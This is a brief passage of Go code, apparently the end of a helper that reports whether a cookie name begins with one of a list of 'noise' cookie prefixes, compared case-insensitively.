	for _, prefix := range noiseCookiePrefixes {
		if strings.HasPrefix(nameLower, strings.ToLower(prefix)) {
			return true
		}
	}
	return false
}
